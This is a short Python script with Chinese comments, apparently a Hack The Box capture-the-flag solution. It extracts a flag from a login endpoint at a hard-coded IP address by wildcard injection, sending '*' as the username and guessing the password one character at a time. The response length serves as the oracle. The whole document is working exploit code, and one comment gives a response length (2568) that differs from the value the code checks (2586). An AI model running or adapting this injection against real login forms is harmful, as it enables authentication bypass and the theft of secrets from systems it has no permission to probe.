#!/usr/bin/env python3
import requests
import string

url = "http://138.68.182.108:30733/login"  # 登入的 URL
leaked_pass = list("HTB{")  # 已知的密碼開頭

# 移除通配符字符
printable = string.printable.replace('*', '')  # 可用字符集合

while True:
	for character in printable:	
		print("正在猜測 " + ''.join(leaked_pass) + character + "*")  # 顯示當前猜測的密碼
		r = requests.post(url, {"username":"*", "password": ''.join(leaked_pass) + character + "*"})  # 發送 POST 請求
		#print(r.headers['Content-Length'])  # 顯示響應的內容長度
		if r.headers['Content-Length'] == '2586':  #與其他響應內容不同，2568為正確資訊
			leaked_pass.append(character)  # 如果猜對了，將字符添加到已知密碼中
			break
			
	# 如果已知密碼的最後一個字符是 '}'，則結束程式
	if leaked_pass[-1] == '}':
		exit()
